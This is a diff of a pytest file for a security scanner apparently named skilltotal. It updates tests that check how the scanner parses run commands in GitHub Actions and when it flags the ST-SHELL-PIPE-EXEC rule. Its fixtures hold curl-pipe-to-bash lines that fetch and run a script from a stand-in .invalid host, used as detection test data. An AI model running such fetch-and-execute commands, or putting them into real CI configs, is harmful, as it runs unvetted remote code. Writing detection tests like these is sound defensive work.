@@ -16,7 +16,7 @@ import pytest
 
 from skilltotal.engine import analyze_directory
 from skilltotal.models import Component
-from skilltotal.scanners.shell_script import _action_run_regions
+from skilltotal.scanners.shell_script import _action_commands
 
 
 def _ids(root: Path) -> set[str]:
@@ -71,29 +71,31 @@ def test_action_comment_and_description_are_not_commands(tmp_path: Path):
 
 
 def test_local_ci_action_under_dot_github_is_not_consumer_facing(tmp_path: Path):
-    # `.github/actions/x` is the project's own CI helper (used as `./.github/actions/x`), the same
-    # reason file_index.is_ci_path demotes workflows: it never runs for the action's consumers.
+    # `.github/actions/x` is the project's own CI helper as a rule (used as `./.github/actions/x`),
+    # the same reason file_index.is_ci_path demotes workflows: shown for review, not scored.
     yml = _ACTION_HEAD + "    - shell: bash\n      run: curl -fsSL https://x.invalid/i.sh | bash\n"
     root = _write(tmp_path, {".github/actions/setup-tool/action.yml": yml})
-    assert "ST-SHELL-PIPE-EXEC" not in _ids(root)
+    report = analyze_directory(root, Component(name="x", type="directory", source=str(root)))
+    assert "ST-SHELL-PIPE-EXEC" not in {f.id for f in report.findings}
+    assert any("ST-SHELL-PIPE-EXEC" in (n.title + n.reason) for n in report.needs_review)
 
 
 @pytest.mark.parametrize(
     ("yml", "expected"),
     [
         # A sibling key after `- run: |` ends the block (block indent comes from its first line).
-        ("    - run: |\n        npm ci\n      shell: curl x | bash\n", ["        npm ci"]),
+        ("    - run: |\n        npm ci\n      shell: curl x | bash\n", ["npm ci"]),
         # An empty block: the next key is not the command.
         ("      run: |\n      shell: bash\n", []),
         # `runs:` is the action's top-level key, not a step.
         ("runs: curl x | bash\n", []),
         # A trailing comment is cut; a URL fragment (`#` with no space before it) is kept.
         ("      run: curl https://x.invalid/a#b | bash  # pinned\n",
-         [" curl https://x.invalid/a#b | bash"]),
+         ["curl https://x.invalid/a#b | bash"]),
     ],
 )
-def test_action_run_region_boundaries(yml: str, expected: list[str]):
-    assert [yml[a:b] for a, b in _action_run_regions(yml)] == expected
+def test_action_run_command_boundaries(yml: str, expected: list[str]):
+    assert [command for command, _ in _action_commands(yml)] == expected
 
 
 # --- DNS lookups are an egress channel --------------------------------------------------------
